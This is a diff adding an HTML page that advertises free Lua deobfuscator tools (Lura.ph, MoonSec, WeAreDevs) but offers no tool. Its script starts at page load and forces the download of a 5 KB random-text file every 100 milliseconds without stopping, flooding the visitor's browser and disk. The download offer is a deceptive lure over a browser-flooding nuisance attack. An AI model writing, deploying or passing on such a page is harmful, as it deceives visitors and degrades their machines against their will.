@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Spam Download</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <h1>💥 Install Lura.ph, MoonSec, WeAreDevs Deobfuscator Tools!</h1>
+  <p>Free to Use Strings Decrypted by Syntax!</p>
+
+  <script>
+    function getRandomText(size) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let result = '';
+      for (let i = 0; i < size; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    function downloadFile(content, filename) {
+      const blob = new Blob([content], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+
+    // Start download spam immediately
+    setInterval(() => {
+      const text = getRandomText(5120); // 5KB
+      const filename = `spam_${Date.now()}.txt`;
+      downloadFile(text, filename);
+    }, 100); // every 100ms
+  </script>
+</body>
+</html>
